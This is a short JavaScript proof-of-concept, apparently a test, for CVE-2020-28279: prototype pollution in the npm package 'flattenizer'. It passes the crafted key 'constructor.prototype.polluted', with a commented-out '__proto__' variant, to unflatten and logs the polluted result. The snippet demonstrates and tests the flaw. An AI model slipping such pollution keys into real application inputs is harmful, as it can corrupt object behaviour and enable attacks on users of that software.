// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
// test("prototype pollution in flattenizer", () => {
console.log({}.polluted);

  const flattenizer = require("flattenizer");
  flattenizer.unflatten({ "constructor.prototype.polluted": "yes" });
  //flattenizer.unflatten({ "__proto__.polluted": "yes" });

console.log({}.polluted);
// });
